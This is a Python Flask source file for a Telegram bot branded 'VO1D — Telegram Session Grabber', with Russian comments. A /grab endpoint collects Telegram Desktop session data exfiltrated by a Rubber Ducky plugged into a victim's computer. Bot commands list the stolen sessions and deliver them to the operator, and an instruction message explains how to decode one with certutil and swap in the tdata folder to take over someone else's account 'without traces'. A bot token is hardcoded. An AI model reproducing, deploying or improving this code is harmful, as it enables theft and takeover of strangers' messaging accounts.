from flask import Flask, request, jsonify
import json
import os
from datetime import datetime
import requests
import base64

app = Flask(__name__)

# ============================================================
# ТОКЕН БОТА
# ============================================================
TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

# ============================================================
# ПАПКА ДЛЯ ЛОГОВ
# ============================================================
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# ОТПРАВКА СООБЩЕНИЙ
# ============================================================
def send_message(chat_id, text, keyboard=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        payload["reply_markup"] = json.dumps(keyboard)
    requests.post(url, json=payload)

def send_file(chat_id, file_path, caption=""):
    url = f"{TELEGRAM_API}/sendDocument"
    with open(file_path, 'rb') as f:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"document": f})

# ============================================================
# КЛАВИАТУРА
# ============================================================
def get_keyboard():
    return {
        "keyboard": [
            ["📊 Логи сессий", "📥 Моя сессия"],
            ["📖 Инструкция", "🗑️ Очистить"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

# ============================================================
# ОБРАБОТКА СООБЩЕНИЙ
# ============================================================
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if not data or "message" not in data:
        return "OK", 200
    
    chat_id = data["message"]["chat"]["id"]
    text = data["message"].get("text", "")
    
    if text == "/start":
        send_message(
            chat_id,
            "🖤 **VO1D — Telegram Session Grabber**\n\n"
            "Я принимаю Telegram сессии от Rubber Ducky.\n"
            "Просто вставь флешку в компьютер жертвы.\n\n"
            "Выбери действие:",
            get_keyboard()
        )
    
    elif text == "📊 Логи сессий":
        files = get_logs()
        if not files:
            send_message(chat_id, "📭 **Нет сессий**")
        else:
            msg = "📊 **Список сессий:**\n\n"
            for f in files[:10]:
                msg += f"📄 `{f}`\n"
            send_message(chat_id, msg)
    
    elif text == "📥 Моя сессия":
        files = get_logs()
        if not files:
            send_message(chat_id, "📭 **Нет сессий**")
            return "OK", 200
        
        # Берём последнюю сессию
        latest = files[0]
        path = os.path.join(LOG_DIR, latest)
        
        # Отправляем файл
        with open(path, 'rb') as f:
            send_file(chat_id, path, caption=f"📁 **Сессия:** {latest}\n\nДекодируй:\n`certutil -decode {latest} session.zip`")
    
    elif text == "📖 Инструкция":
        send_message(
            chat_id,
            "📖 **ИНСТРУКЦИЯ**\n\n"
            "1️⃣ Вставь Rubber Ducky в ПК жертвы\n"
            "2️⃣ Скрипт скопирует Telegram сессию\n"
            "3️⃣ Сессия придёт сюда\n"
            "4️⃣ Нажми '📥 Моя сессия' — скачай файл\n"
            "5️⃣ Декодируй:\n"
            "   `certutil -decode имя_файла.b64 session.zip`\n"
            "6️⃣ Распакуй архив\n"
            "7️⃣ Замени папку `%AppData%\\Telegram Desktop\\tdata`\n"
            "8️⃣ Запусти Telegram — ты в чужом аккаунте!\n\n"
            "⚡ **VO1D — тихо, быстро, без следов.**"
        )
    
    elif text == "🗑️ Очистить":
        for f in os.listdir(LOG_DIR):
            os.remove(os.path.join(LOG_DIR, f))
        send_message(chat_id, "✅ **Все сессии удалены**")
    
    else:
        send_message(chat_id, "❓ Используй кнопки.", get_keyboard())
    
    return "OK", 200

# ============================================================
# ПРИНИМАЕТ POST ОТ RUBBER DUCKY
# ============================================================
@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        if not data:
            data = {"raw": request.get_data(as_text=True)}

        name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.b64"
        path = os.path.join(LOG_DIR, name)

        # Если пришла Base64 строка
        if "telegram" in data and data["telegram"]:
            with open(path, 'w') as f:
                f.write(data["telegram"])
            print(f"[+] Saved TG session: {name}")
        else:
            # Сохраняем всё в JSON
            name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            path = os.path.join(LOG_DIR, name)
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

        return jsonify({"status": "OK", "file": name}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 500

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ
# ============================================================
def get_logs():
    files = [f for f in os.listdir(LOG_DIR)]
    return sorted(files, reverse=True)

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
